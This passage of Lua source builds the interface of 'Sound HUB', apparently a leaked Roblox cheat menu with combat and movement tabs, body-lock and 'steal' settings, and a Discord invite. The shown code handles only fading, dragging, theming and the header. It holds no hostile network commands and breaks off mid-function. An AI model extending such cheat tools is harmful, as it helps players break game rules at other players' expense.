    if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then return end
    if _G.SoundUIIdleTransparent == transparent then return end
    _G.SoundUIIdleTransparent = transparent
    local targetRowT = transparent and 0.82 or 0.3
    local targetStrokeT = transparent and 0.78 or 0.38
    local targetToggleT = transparent and 0.72 or 0.2
    pcall(function()
        for _, obj in ipairs(Main:GetDescendants()) do
            if obj:IsA("Frame") and obj:FindFirstChild("ToggleButton") then
                TweenService:Create(obj, TweenInfo.new(0.35), {BackgroundTransparency = targetRowT}):Play()
                local st = obj:FindFirstChildOfClass("UIStroke")
                if st then
                    TweenService:Create(st, TweenInfo.new(0.35), {Transparency = targetStrokeT}):Play()
                end
                local track = obj:FindFirstChild("Track", true)
                if track and track:IsA("Frame") then
                    TweenService:Create(track, TweenInfo.new(0.35), {BackgroundTransparency = targetToggleT}):Play()
                end
            elseif obj:IsA("Frame") and obj.Name ~= "Main" and obj.Parent and (obj.Parent.Name == "MOVEMENT" or obj.Parent.Name == "COMBAT" or obj.Parent.Name == "UTILITY" or obj.Parent.Name == "SETTINGS" or obj.Parent.Name == "KEYBINDS" or obj.Parent.Name == "MENU CUSTOMIZE" or obj.Parent == Main) then
                -- fade general setting rows slightly
                if obj:FindFirstChild("Label") and not obj:FindFirstChild("ToggleButton") then
                    local baseT = obj:GetAttribute("SoundBaseTransparency")
                    if baseT == nil then
                        obj:SetAttribute("SoundBaseTransparency", obj.BackgroundTransparency)
                        baseT = obj.BackgroundTransparency
                    end
                    local t = transparent and math.min(0.9, (baseT or 0.3) + 0.45) or (baseT or 0.3)
                    TweenService:Create(obj, TweenInfo.new(0.35), {BackgroundTransparency = t}):Play()
                end
            end
        end
    end)
end
function _G.SoundUIWake()
    _G.SoundUILastInteract = tick()
    _exeSetUIIdle(false)
end
task.spawn(function()
    if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then return end
    while Main and Main.Parent do
        if tick() - (_G.SoundUILastInteract or tick()) >= 5 then
            _exeSetUIIdle(true)
        end
        task.wait(0.25)
    end
end)
Main.InputBegan:Connect(function()
    if _G.SoundUIWake then _G.SoundUIWake() end
end)
pcall(function()
    Main.DescendantAdded:Connect(function(d)
        if d:IsA("GuiButton") or d:IsA("TextBox") then
            d.MouseButton1Down:Connect(function()
                if _G.SoundUIWake then _G.SoundUIWake() end
            end)
            if d:IsA("TextBox") then
                d.Focused:Connect(function()
                    if _G.SoundUIWake then _G.SoundUIWake() end
                end)
            end
        end
    end)
    for _, d in ipairs(Main:GetDescendants()) do
        if d:IsA("GuiButton") or d:IsA("TextBox") then
            d.MouseButton1Down:Connect(function()
                if _G.SoundUIWake then _G.SoundUIWake() end
            end)
            if d:IsA("TextBox") then
                d.Focused:Connect(function()
                    if _G.SoundUIWake then _G.SoundUIWake() end
                end)
            end
        end
    end
end)

makeDraggable(Main)
Main:GetPropertyChangedSignal("Position"):Connect(function()
savedMainPositionTable = udim2ToTable(Main.Position)
end)
local MiniFrame = Instance.new("TextButton")
MiniFrame.Name = "MiniFrame"
local _mobileBtnBase = math.floor((tonumber(_G.SoundMobileButtonScale) or 1) * 58)
local miniBtnSize = math.floor(_mobileBtnBase * 0.70)
if miniBtnSize < 52 then miniBtnSize = 52 end
if miniBtnSize > 84 then miniBtnSize = 84 end
local miniW, miniH = 134, 40
MiniFrame.Size = UDim2.new(0, miniW, 0, miniH)
local MINI_DEFAULT_POSITION = UDim2.new(0, 20, 0.5, -miniH / 2)
-- Terapkan posisi tersimpan dari config, atau pakai default jika belum ada
MiniFrame.Position = savedMiniPositionTable and tableToUDim2(savedMiniPositionTable, MINI_DEFAULT_POSITION) or MINI_DEFAULT_POSITION
-- savedMiniPositionTable JANGAN di-reset; biarkan nilai dari loadSoundConfig()
MiniFrame.BackgroundColor3 = Color3.fromRGB(24, 12, 38)
MiniFrame.BackgroundTransparency = 0
MiniFrame.BorderSizePixel = 0
MiniFrame.Text = ""
MiniFrame.TextColor3 = Color3.fromRGB(255, 255, 255)
MiniFrame.Font = Enum.Font.GothamBlack
MiniFrame.TextSize = 14
MiniFrame.AutoButtonColor = false
MiniFrame.Visible = false
MiniFrame.Active = true
MiniFrame.ZIndex = 100
MiniFrame.Parent = Gui
corner(MiniFrame, 10)
local MiniSoundStroke = Instance.new("UIStroke")
MiniSoundStroke.Color = Color3.fromRGB(168, 85, 247)
MiniSoundStroke.Thickness = 1.6
MiniSoundStroke.Transparency = 0.1
MiniSoundStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
MiniSoundStroke.Parent = MiniFrame

-- Gaya foto: avatar kotak kiri | garis | tulisan MENU
local MiniAvatar = Instance.new("ImageLabel")
MiniAvatar.Name = "MiniAvatar"
MiniAvatar.BackgroundColor3 = Color3.fromRGB(39, 20, 61)
MiniAvatar.BorderSizePixel = 0
MiniAvatar.Size = UDim2.new(0, 30, 0, 30)
MiniAvatar.Position = UDim2.new(0, 6, 0.5, -15)
MiniAvatar.ScaleType = Enum.ScaleType.Crop
MiniAvatar.ZIndex = 102
MiniAvatar.Parent = MiniFrame
corner(MiniAvatar, 8)
stroke(MiniAvatar, Color3.fromRGB(192, 132, 252), 1.2, 0.2)
task.spawn(function()
    local ok, url = pcall(function()
        return Players:GetUserThumbnailAsync(LP.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
    end)
    if ok and url and MiniAvatar.Parent then MiniAvatar.Image = url end
end)
local MiniDivider = Instance.new("Frame")
MiniDivider.Name = "MiniDivider"
MiniDivider.BackgroundColor3 = Color3.fromRGB(112, 55, 170)
MiniDivider.BorderSizePixel = 0
MiniDivider.Size = UDim2.new(0, 1, 0, 26)
MiniDivider.Position = UDim2.new(0, 43, 0.5, -13)
MiniDivider.ZIndex = 102
MiniDivider.Parent = MiniFrame
local MiniLabel = Instance.new("TextLabel")
MiniLabel.Name = "MiniLabel"
MiniLabel.BackgroundTransparency = 1
MiniLabel.Size = UDim2.new(1, -46, 0, 18)
MiniLabel.Position = UDim2.new(0, 46, 0.5, -12)
MiniLabel.Text = "SOUND"
MiniLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
MiniLabel.Font = Enum.Font.GothamBlack
MiniLabel.TextSize = 14
MiniLabel.TextXAlignment = Enum.TextXAlignment.Center
MiniLabel.ZIndex = 102
MiniLabel.Parent = MiniFrame

local MiniSubLabel = Instance.new("TextLabel")
MiniSubLabel.Name = "MiniSubLabel"
MiniSubLabel.BackgroundTransparency = 1
MiniSubLabel.Size = UDim2.new(1, -46, 0, 11)
MiniSubLabel.Position = UDim2.new(0, 46, 0.5, 5)
MiniSubLabel.Text = "menu"
MiniSubLabel.TextColor3 = Color3.fromRGB(205, 180, 230)
MiniSubLabel.Font = Enum.Font.GothamMedium
MiniSubLabel.TextSize = 9
MiniSubLabel.TextXAlignment = Enum.TextXAlignment.Center
MiniSubLabel.ZIndex = 102
MiniSubLabel.Parent = MiniFrame

-- keep MiniButton alias for any old refs
local MiniButton = MiniFrame

do
    local mdn, mds, msp = false, nil, nil
    local miniMoved = false
    local DRAG_DEADZONE = 6

    MiniFrame.InputBegan:Connect(function(i)
        if _G.SoundGuiLocked == true then return end
        if i.UserInputType == Enum.UserInputType.MouseButton1
        or i.UserInputType == Enum.UserInputType.Touch then
            mdn = true
            miniMoved = false
            mds = i.Position
            msp = MiniFrame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then
                    mdn = false
                    if miniMoved then
                        savedMiniPositionTable = udim2ToTable(MiniFrame.Position)
                        if type(saveSoundConfig) == "function" then pcall(saveSoundConfig) end
                    end
                end
            end)
        end
    end)

    UserInputService.InputChanged:Connect(function(i)
        if not mdn or _G.SoundGuiLocked == true then return end
        if i.UserInputType ~= Enum.UserInputType.MouseMovement
        and i.UserInputType ~= Enum.UserInputType.Touch then return end
        if not mds or not msp then return end
        local dx = i.Position.X - mds.X
        local dy = i.Position.Y - mds.Y
        if math.abs(dx) > DRAG_DEADZONE or math.abs(dy) > DRAG_DEADZONE then
            miniMoved = true
        end
        MiniFrame.Position = UDim2.new(
            msp.X.Scale,
            msp.X.Offset + dx,
            msp.Y.Scale,
            msp.Y.Offset + dy
        )
        if miniMoved then
            savedMiniPositionTable = udim2ToTable(MiniFrame.Position)
        end
    end)

    MiniFrame.MouseButton1Click:Connect(function()
        if miniMoved then return end
        if _G.SoundOpenMainUI then
            _G.SoundOpenMainUI()
        else
            Main.Visible = true
            MiniFrame.Visible = false
            Main.Size = FULL_MAIN_SIZE
            _G.__SoundDuelsMinimized = false
        end
        if saveSoundConfig then pcall(saveSoundConfig) end
    end)
end

-- Open / close with side glide (after MiniFrame exists)
local _exeUITween = nil
function _G.SoundOpenMainUI()
    local targetPos = Main.Position
    if savedMainPositionTable then
        pcall(function()
            targetPos = tableToUDim2(savedMainPositionTable, targetPos)
        end)
    end
    Main.Size = FULL_MAIN_SIZE
    if MiniFrame then MiniFrame.Visible = false end
    _G.__SoundDuelsMinimized = false
    local startPos = UDim2.new(
        targetPos.X.Scale,
        targetPos.X.Offset - 460,
        targetPos.Y.Scale,
        targetPos.Y.Offset
    )
    Main.Position = startPos
    Main.Visible = true
    if _exeUITween then pcall(function() _exeUITween:Cancel() end) end
    _exeUITween = TweenService:Create(
        Main,
        TweenInfo.new(0.38, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
        { Position = targetPos }
    )
    _exeUITween:Play()
    savedMainPositionTable = udim2ToTable(targetPos)
end

function _G.SoundCloseMainUI()
    local curPos = Main.Position
    if savedMainPositionTable then
        pcall(function()
            curPos = tableToUDim2(savedMainPositionTable, curPos)
        end)
    end
    -- remember where it should return
    savedMainPositionTable = udim2ToTable(curPos)
    local outPos = UDim2.new(
        curPos.X.Scale,
        curPos.X.Offset - 460,
        curPos.Y.Scale,
        curPos.Y.Offset
    )
    if _exeUITween then pcall(function() _exeUITween:Cancel() end) end
    _exeUITween = TweenService:Create(
        Main,
        TweenInfo.new(0.32, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
        { Position = outPos }
    )
    _exeUITween:Play()
    _exeUITween.Completed:Connect(function()
        Main.Visible = false
        Main.Position = curPos -- restore logical position for next open
        if MiniFrame then
            MiniFrame.Visible = true
            -- restore saved position or default
            if savedMiniPositionTable then
                MiniFrame.Position = tableToUDim2(savedMiniPositionTable, MINI_DEFAULT_POSITION)
            else
                MiniFrame.Position = MINI_DEFAULT_POSITION
            end
        end
        _G.__SoundDuelsMinimized = true
    end)
end

local RandomImageIDs = {
"86947414982221",
}
local BackgroundIDs = RandomImageIDs
local ButtonImageIDs = RandomImageIDs

local function pickRandomImageId()
    return "86947414982221"
end
local _randomBgId = "86947414982221"
_G.SoundMobileButtonImage = ""
_G.SoundStealUIImage = ""


_G.SoundThemeColors = {
PURPLE = Color3.fromRGB(168, 85, 247),
BLUE   = Color3.fromRGB(168, 85, 247),
RED    = Color3.fromRGB(168, 85, 247),
PINK   = Color3.fromRGB(192, 132, 252),
YELLOW = Color3.fromRGB(192, 132, 252),
GREY   = Color3.fromRGB(112, 55, 170),
WHITE  = Color3.fromRGB(255, 255, 255),
FOREST = Color3.fromRGB(112, 55, 170),
}

_G.SoundThemeName = "PURPLE" -- purple theme
currentBackground = tonumber(savedConfig.currentBackground) or currentBackground
_G.SoundBodyLockEnabled = savedConfig.bodyLockEnabled == true
_G.SoundBodyLockRadius = tonumber(savedConfig.bodyLockRadius) or _G.SoundBodyLockRadius or 60
if savedConfig.mobileButtonScale ~= nil then _G.SoundMobileButtonScale = tonumber(savedConfig.mobileButtonScale) or _G.SoundMobileButtonScale or 0.75 end
if savedConfig.guiScaleValue ~= nil then _G.SoundGuiScaleValue = tonumber(savedConfig.guiScaleValue) or _G.SoundGuiScaleValue end
if savedConfig.stealUiScaleValue ~= nil then _G.SoundProgressBarScaleValue = tonumber(savedConfig.stealUiScaleValue) or _G.SoundProgressBarScaleValue end
_G.SoundHeadlessEnabled = savedConfig.headlessEnabled == true
_G.SoundKorbloxEnabled = savedConfig.korbloxEnabled == true
local BgImage = nil
function applyBackground(index)
Main.BackgroundColor3 = COLORS.bg
currentBackground = 0
return "None"
end
applyBackground(0)
-- Background image di belakang gradient efek, pas dengan ukuran menu
do
    local menuBgImage = Instance.new("ImageLabel")
    menuBgImage.Name = "MenuBgImage"
    menuBgImage.Size = UDim2.new(1, -1, 1, -1)
    menuBgImage.Position = UDim2.new(0, 0, 0, 0)
    menuBgImage.BackgroundTransparency = 1
    menuBgImage.Image = "rbxassetid://105518401154679"
    menuBgImage.ImageTransparency = 0
    menuBgImage.ScaleType = Enum.ScaleType.Crop
    menuBgImage.ZIndex = 0
    menuBgImage.ClipsDescendants = false
    menuBgImage.Parent = Main
    corner(menuBgImage, 30)
end
-- Efek putih di menu: glow abu-putih halus + kilau bergerak + outline putih berputar
do
    Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    local baseGrad = Main:FindFirstChild("WhiteFXBase") or Instance.new("UIGradient")
    baseGrad.Name = "WhiteFXBase"
    baseGrad.Rotation = 35
    baseGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(10, 10, 12)),
        ColorSequenceKeypoint.new(0.22, Color3.fromRGB(48, 48, 52)),
        ColorSequenceKeypoint.new(0.42, Color3.fromRGB(12, 12, 14)),
        ColorSequenceKeypoint.new(0.62, Color3.fromRGB(58, 58, 63)),
        ColorSequenceKeypoint.new(0.82, Color3.fromRGB(14, 14, 16)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(42, 42, 46)),
    })
    baseGrad.Parent = Main

    local fx = Main:FindFirstChild("WhiteFX") or Instance.new("Frame")
    fx.Name = "WhiteFX"
    fx.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    fx.BorderSizePixel = 0
    fx.Active = false
    fx.Size = UDim2.new(1, 0, 1, 0)
    fx.ZIndex = 1
    fx.Parent = Main
    corner(fx, 30)
    local fxGrad = fx:FindFirstChildOfClass("UIGradient") or Instance.new("UIGradient")
    fxGrad.Rotation = -30
    fxGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0.00, 1),
        NumberSequenceKeypoint.new(0.30, 1),
        NumberSequenceKeypoint.new(0.42, 0.9),
        NumberSequenceKeypoint.new(0.50, 0.82),
        NumberSequenceKeypoint.new(0.58, 0.9),
        NumberSequenceKeypoint.new(0.70, 1),
        NumberSequenceKeypoint.new(1.00, 1),
    })
    fxGrad.Offset = Vector2.new(-0.8, 0)
    fxGrad.Parent = fx
    pcall(function()
        TweenService:Create(fxGrad, TweenInfo.new(5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Offset = Vector2.new(0.8, 0)}):Play()
    end)

    local mainStroke = Main:FindFirstChildOfClass("UIStroke")
    if mainStroke then
        mainStroke.Color = Color3.fromRGB(168, 85, 247)
        mainStroke.Thickness = 1.8
        mainStroke.Transparency = 0.1
        local sg = mainStroke:FindFirstChildOfClass("UIGradient") or Instance.new("UIGradient")
        sg.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(112, 55, 170)),
            ColorSequenceKeypoint.new(0.35, Color3.fromRGB(168, 85, 247)),
            ColorSequenceKeypoint.new(0.50, Color3.fromRGB(216, 180, 254)),
            ColorSequenceKeypoint.new(0.65, Color3.fromRGB(168, 85, 247)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(112, 55, 170)),
        })
        sg.Parent = mainStroke
        pcall(function()
            sg.Rotation = 0
            TweenService:Create(sg, TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1, false), {Rotation = 360}):Play()
        end)
    end
end
-- Nine Duels style header bar
local HeaderBar = Instance.new("Frame")
HeaderBar.Name = "HeaderBar"
HeaderBar.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
HeaderBar.BackgroundTransparency = 0.05
HeaderBar.BorderSizePixel = 0
HeaderBar.Size = UDim2.new(1, -20, 0, 56)
HeaderBar.Position = UDim2.new(0, 10, 0, 10)
HeaderBar.ZIndex = 8
HeaderBar.Parent = Main
HeaderBar.Visible = false -- header dihapus (tampilan)
corner(HeaderBar, 14)
stroke(HeaderBar, Color3.fromRGB(45, 45, 50), 1.0, 0.3)

local TitleAccent = Instance.new("Frame")
TitleAccent.Name = "TitleAccent"
TitleAccent.BackgroundColor3 = Color3.fromRGB(240, 240, 245)
TitleAccent.BorderSizePixel = 0
TitleAccent.Size = UDim2.new(0, 3, 0, 28)
TitleAccent.Position = UDim2.new(0, 12, 0.5, -14)
TitleAccent.ZIndex = 10
TitleAccent.Parent = HeaderBar
corner(TitleAccent, 2)

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(0, 200, 0, 20)
Title.Position = UDim2.new(0, 24, 0, 10)
Title.Text = "Sound HUB"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextStrokeTransparency = 1
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 16
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.ZIndex = 12
Title.Parent = HeaderBar
Title.Visible = true

local SubTitle = Instance.new("TextLabel")
SubTitle.Name = "SubTitle"
SubTitle.BackgroundTransparency = 1
SubTitle.Size = UDim2.new(0, 200, 0, 14)
SubTitle.Position = UDim2.new(0, 24, 0, 30)
SubTitle.Text = "discord.gg/hwwWrXUbV"
SubTitle.TextColor3 = Color3.fromRGB(130, 130, 135)
SubTitle.Font = Enum.Font.Gotham
SubTitle.TextSize = 10
SubTitle.TextXAlignment = Enum.TextXAlignment.Left
SubTitle.ZIndex = 12
SubTitle.Parent = HeaderBar
SubTitle.Visible = true

-- Main logo removed (Calcium-style header text only)
local SoundLogoAsset = nil

--Leaked By Xlu0 AndPrime--
local TitleSweepText = Title:Clone()
TitleSweepText.Name = "TitleSweepText"
TitleSweepText.TextColor3 = Color3.fromRGB(0, 0, 0)
TitleSweepText.TextTransparency = 0
TitleSweepText.TextStrokeTransparency = 1
TitleSweepText.BackgroundTransparency = 1
TitleSweepText.ZIndex = Title.ZIndex + 1
TitleSweepText.Visible = false -- logo sweep disabled
TitleSweepText.Parent = Main

local SweepGradient = Instance.new("UIGradient")
SweepGradient.Rotation = 12
SweepGradient.Offset = Vector2.new(-1.25, 0)
SweepGradient.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0.00, 1),
    NumberSequenceKeypoint.new(0.43, 1),
    NumberSequenceKeypoint.new(0.49, 0.55),
    NumberSequenceKeypoint.new(0.50, 0.00),
    NumberSequenceKeypoint.new(0.51, 0.55),
    NumberSequenceKeypoint.new(0.57, 1),
    NumberSequenceKeypoint.new(1.00, 1)
})
SweepGradient.Parent = TitleSweepText

task.spawn(function()
    while false do
        SweepGradient.Offset = Vector2.new(-1.25, 0)
        local sweepTween = TweenService:Create(
            SweepGradient,
            TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
            {Offset = Vector2.new(1.25, 0)}
        )
        sweepTween:Play()
        sweepTween.Completed:Wait()
        task.wait(1.2)
    end
end)
-- Line separator under discord link
local HeaderDivider = Instance.new("Frame")
HeaderDivider.Name = "HeaderDivider"
HeaderDivider.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
HeaderDivider.BackgroundTransparency = 0.05
HeaderDivider.BorderSizePixel = 0
HeaderDivider.Size = UDim2.new(1, -32, 0, 1)
HeaderDivider.Position = UDim2.new(0, 16, 0, 58)
HeaderDivider.ZIndex = 7
HeaderDivider.Visible = false
HeaderDivider.Parent = Main
local HeaderDividerGrad = Instance.new("UIGradient")
HeaderDividerGrad.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 0.85),
    NumberSequenceKeypoint.new(0.12, 0.15),
    NumberSequenceKeypoint.new(0.5, 0),
    NumberSequenceKeypoint.new(0.88, 0.15),
    NumberSequenceKeypoint.new(1, 0.85),
})
HeaderDividerGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 120, 120)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 120, 120)),
})
HeaderDividerGrad.Parent = HeaderDivider
-- Soft glow under the line for extra visibility
local HeaderDividerGlow = Instance.new("Frame")
HeaderDividerGlow.Name = "HeaderDividerGlow"
HeaderDividerGlow.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
HeaderDividerGlow.BackgroundTransparency = 0.82
HeaderDividerGlow.BorderSizePixel = 0
HeaderDividerGlow.Size = UDim2.new(1, -48, 0, 4)
HeaderDividerGlow.Position = UDim2.new(0, 24, 0, 56)
HeaderDividerGlow.ZIndex = 6
HeaderDividerGlow.Visible = false
HeaderDividerGlow.Parent = Main
local HeaderDividerGlowGrad = Instance.new("UIGradient")
HeaderDividerGlowGrad.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 1),
    NumberSequenceKeypoint.new(0.5, 0.2),
    NumberSequenceKeypoint.new(1, 1),
})
HeaderDividerGlowGrad.Parent = HeaderDividerGlow
local Close = Instance.new("TextButton")
Close.Name = "Close"
Close.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
Close.BackgroundTransparency = 0
Close.BorderSizePixel = 0
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(255, 255, 255)
Close.TextSize = 22
Close.Font = Enum.Font.GothamBlack
Close.Size = UDim2.new(0, 38, 0, 38)
Close.Position = UDim2.new(1, -46, 0, 4)
Close.AutoButtonColor = false
Close.ZIndex = 12
Close.Parent = Main
corner(Close, 999)
stroke(Close, Color3.fromRGB(168, 85, 247), 1.5, 0.25)

local LockBtn = Instance.new("TextButton")
LockBtn.Name = "LockBtn"
LockBtn.BackgroundColor3 = Color3.fromRGB(24, 12, 38)
LockBtn.BorderSizePixel = 0
LockBtn.Text = "UNLOCKED"
LockBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
LockBtn.TextSize = 9
LockBtn.Font = Enum.Font.GothamBold
LockBtn.Size = UDim2.new(0, 72, 0, 28)
LockBtn.Position = UDim2.new(1, -118, 0.5, -14)
LockBtn.AutoButtonColor = false
LockBtn.ZIndex = 12
LockBtn.Parent = HeaderBar
corner(LockBtn, 999)
local LockBtnStroke = Instance.new("UIStroke")
LockBtnStroke.Color = Color3.fromRGB(168, 85, 247)
LockBtnStroke.Thickness = 1.0
LockBtnStroke.Transparency = 0.25
LockBtnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
LockBtnStroke.Parent = LockBtn
local function refreshLockBtn()
    local locked = _G.SoundGuiLocked == true
    LockBtn.Text = locked and "LOCKED" or "UNLOCKED"
    LockBtn.Size = UDim2.new(0, 72, 0, 28)
    LockBtn.Position = UDim2.new(1, -118, 0.5, -14)
    if locked then
        -- locked = gray filled
        LockBtn.BackgroundColor3 = Color3.fromRGB(112, 55, 170)
        LockBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        LockBtnStroke.Color = Color3.fromRGB(192, 132, 252)
        LockBtnStroke.Transparency = 0.1
    else
        -- unlocked = black
        LockBtn.BackgroundColor3 = Color3.fromRGB(24, 12, 38)
        LockBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
        LockBtnStroke.Color = Color3.fromRGB(168, 85, 247)
        LockBtnStroke.Transparency = 0.25
    end
end
function SoundUpdateGuiLockVisual()
    refreshLockBtn()
    if setLockGuiVisual then
        pcall(setLockGuiVisual, _G.SoundGuiLocked == true)
    end
end
_G.SoundUpdateGuiLockVisual = SoundUpdateGuiLockVisual
refreshLockBtn()
LockBtn.MouseButton1Click:Connect(function()
    _G.SoundGuiLocked = not (_G.SoundGuiLocked == true)
    refreshLockBtn()
    if setLockGuiVisual then pcall(setLockGuiVisual, _G.SoundGuiLocked == true) end
    if saveSoundConfig then pcall(saveSoundConfig) end
end)
-- Nine Duels style: profile in header, horizontal tabs, full-width content
local Sidebar = Instance.new("Frame")
Sidebar.Name = "Sidebar"
Sidebar.BackgroundTransparency = 1
Sidebar.BorderSizePixel = 0
Sidebar.Visible = false
Sidebar.Size = UDim2.new(0, 0, 0, 0)
Sidebar.Parent = Main

-- Profile in header (right of title, left of lock)
local ProfileCard = Instance.new("Frame")
ProfileCard.Name = "ProfileCard"
ProfileCard.BackgroundTransparency = 1
ProfileCard.BorderSizePixel = 0
ProfileCard.Size = UDim2.new(0, 140, 0, 40)
ProfileCard.Position = UDim2.new(1, -270, 0.5, -20)
ProfileCard.ZIndex = 12
ProfileCard.Parent = HeaderBar

local Avatar = Instance.new("ImageLabel")
Avatar.Name = "Avatar"
Avatar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Avatar.BackgroundTransparency = 0
Avatar.BorderSizePixel = 0
Avatar.Size = UDim2.new(0, 32, 0, 32)
Avatar.Position = UDim2.new(1, -32, 0.5, -16)
Avatar.ZIndex = 13
Avatar.ScaleType = Enum.ScaleType.Crop
Avatar.Parent = ProfileCard
corner(Avatar, 999)
stroke(Avatar, Color3.fromRGB(180, 180, 185), 1.4, 0.2)

local ProfileUser = Instance.new("TextLabel")
ProfileUser.Name = "ProfileUser"
ProfileUser.BackgroundTransparency = 1
ProfileUser.Size = UDim2.new(1, -40, 0, 14)
ProfileUser.Position = UDim2.new(0, 0, 0, 4)
ProfileUser.Text = tostring(LP.DisplayName or LP.Name or "Player")
ProfileUser.TextColor3 = Color3.fromRGB(245, 245, 245)
ProfileUser.Font = Enum.Font.GothamBold
ProfileUser.TextSize = 11
ProfileUser.TextXAlignment = Enum.TextXAlignment.Right
ProfileUser.TextTruncate = Enum.TextTruncate.AtEnd
ProfileUser.ZIndex = 13
ProfileUser.Parent = ProfileCard

local ProfileName = Instance.new("TextLabel")
ProfileName.Name = "ProfileName"
ProfileName.BackgroundTransparency = 1
ProfileName.Size = UDim2.new(1, -40, 0, 12)
ProfileName.Position = UDim2.new(0, 0, 0, 20)
ProfileName.Text = "@" .. tostring(LP.Name or "player")
ProfileName.TextColor3 = Color3.fromRGB(130, 130, 135)
ProfileName.Font = Enum.Font.Gotham
ProfileName.TextSize = 9
ProfileName.TextXAlignment = Enum.TextXAlignment.Right
ProfileName.TextTruncate = Enum.TextTruncate.AtEnd
ProfileName.ZIndex = 13
ProfileName.Parent = ProfileCard

-- Horizontal tab bar
local TabBar = Instance.new("Frame")
TabBar.Name = "TabBar"
TabBar.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
TabBar.BackgroundTransparency = 0.1
TabBar.BorderSizePixel = 0
TabBar.Size = UDim2.new(1, -20, 0, 40)
TabBar.Position = UDim2.new(0, 10, 1, -50)
TabBar.ZIndex = 6
TabBar.Parent = Main
corner(TabBar, 12)
stroke(TabBar, Color3.fromRGB(40, 40, 45), 1.0, 0.35)

local Tabs = Instance.new("Frame")
Tabs.Name = "Tabs"
Tabs.BackgroundTransparency = 1
Tabs.BorderSizePixel = 0
Tabs.Size = UDim2.new(1, -12, 1, -8)
Tabs.Position = UDim2.new(0, 6, 0, 4)
Tabs.ZIndex = 7
Tabs.Parent = TabBar

local Content = Instance.new("Frame")
Content.Name = "Content"
Content.BackgroundTransparency = 1
Content.Position = UDim2.new(0, 12, 0, 70)
Content.Size = UDim2.new(1, -24, 1, -130)
Content.ZIndex = 3
Content.Parent = Main

-- Logo bulat + tulisan Sound di menu paling atas
do
    local brand = Instance.new("Frame")
    brand.Name = "SoundBrand"
    brand.BackgroundTransparency = 1
    brand.BorderSizePixel = 0
    brand.Size = UDim2.new(0, 470, 0, 88)
    brand.AnchorPoint = Vector2.new(0.5, 0)
    brand.Position = UDim2.new(0.5, 0, 0, -3)
    brand.ZIndex = 12
    brand.Parent = Main

    -- Full SOUND HUB banner image replaces the old circular logo and text.
    local logoImg = Instance.new("ImageLabel")
    logoImg.Name = "Logo"
    logoImg.BackgroundTransparency = 1
    logoImg.BorderSizePixel = 0
    logoImg.Position = UDim2.new(0, 0, 0, 0)
    logoImg.Size = UDim2.new(1, 0, 1, 0)
    logoImg.Image = "rbxassetid://123387081181220"
    logoImg.ScaleType = Enum.ScaleType.Fit
    logoImg.ImageTransparency = 1
    logoImg.ZIndex = 13
    logoImg.Parent = brand

    -- Fade in gently when the GUI is created.
    local TweenService = game:GetService("TweenService")
    TweenService:Create(
        logoImg,
        TweenInfo.new(1.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {ImageTransparency = 0}
    ):Play()

    SoundBrandRoot = brand -- global (hindari batas local), dipakai efek fade idle
end

task.spawn(function()
    local ok, url = pcall(function()
        return Players:GetUserThumbnailAsync(
            LP.UserId,
            Enum.ThumbnailType.HeadShot,
            Enum.ThumbnailSize.Size100x100
        )
    end)
    if ok and url and Avatar and Avatar.Parent then
        Avatar.Image = url
    end
end)

--Leaked By Xlu0 AndPrime--
--Leaked By Xlu0 AndPrime--
do
local IDLE_DELAY = 5
local FADE_TIME = 0.45
local idleToken = 0
local idleCollapsed = false
local savedTransparency = setmetatable({}, {__mode = "k"})
local activeTweens = setmetatable({}, {__mode = "k"})

local function rememberObject(obj)
    if savedTransparency[obj] then return end
    local data = {}
    if obj:IsA("GuiObject") then
        data.BackgroundTransparency = obj.BackgroundTransparency
    end
    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
        data.TextTransparency = obj.TextTransparency
        data.TextStrokeTransparency = obj.TextStrokeTransparency
    end
    if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
        data.ImageTransparency = obj.ImageTransparency
    end
    if obj:IsA("UIStroke") then
        data.Transparency = obj.Transparency
    end
    savedTransparency[obj] = data
end

local function tweenObject(obj, collapsed)
    rememberObject(obj)
    local base = savedTransparency[obj]
    if not base then return end

